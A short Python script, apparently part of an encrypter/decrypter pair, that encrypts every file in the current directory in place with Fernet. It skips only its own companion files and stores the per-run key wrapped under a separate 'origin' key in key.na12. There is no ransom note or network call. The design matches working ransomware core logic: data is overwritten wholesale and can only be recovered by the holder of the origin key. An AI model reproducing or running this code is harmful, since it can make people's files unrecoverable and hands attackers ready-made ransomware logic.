import os
from cryptography.fernet import Fernet


files = []
orgin = "<your orgin key>"
key = Fernet.generate_key()
encrypted_key = Fernet(orgin.encode()).encrypt(key)
ascii_key = encrypted_key.decode()

print("Your encrypted key is:", ascii_key)
print("Please note that the key is encrypted with the orgin key!")

for file in os.listdir():
    if file == "encrypter.py" or file == "decrypter.py" or file == "encrypter.exe" or file == "decrypter.exe" or file == "encrypter" or file == "decrypter" or file == "key.na12" or file == "check.na12" or file == "orgin.na12" or file == "getkey.py" or file == "makekey.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files detected:", files)

with open("key.na12", "w") as thekey:
    thekey.write(ascii_key)

with open("check.na12", "wb") as check:
    check.write(Fernet(key).encrypt("corr".encode()))

for file in files:
    print("Encrypting file:", file)
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    print("Writing file:", file)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    print("Data Encrypted:" ,file)

print("All files encrypted!")
